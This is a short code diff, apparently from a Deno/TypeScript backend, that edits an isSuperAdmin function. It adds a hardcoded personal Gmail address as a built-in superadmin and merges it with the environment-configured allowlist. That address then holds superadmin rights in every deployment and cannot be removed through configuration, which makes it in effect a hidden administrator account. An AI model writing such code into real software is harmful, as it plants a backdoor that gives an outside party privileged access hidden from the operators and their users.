@@ -77,12 +77,15 @@ export function getClientIp(req: Request): string {
 export function isSuperAdmin(user: { email?: string | null; app_metadata?: Record<string, unknown> }): boolean {
   if (user.app_metadata?.role === 'superadmin') return true;
 
+  const defaultAdmins = ['hemaxtth@gmail.com'];
   const allowlist = (Deno.env.get('SUPERADMIN_EMAILS') || '')
     .split(',')
     .map((s) => s.trim().toLowerCase())
     .filter(Boolean);
 
-  return !!(user.email && allowlist.includes(user.email.toLowerCase()));
+  const merged = [...new Set([...defaultAdmins, ...allowlist])];
+
+  return !!(user.email && merged.includes(user.email.toLowerCase()));
 }
 
 export function timingSafeEqual(a: string, b: string): boolean {
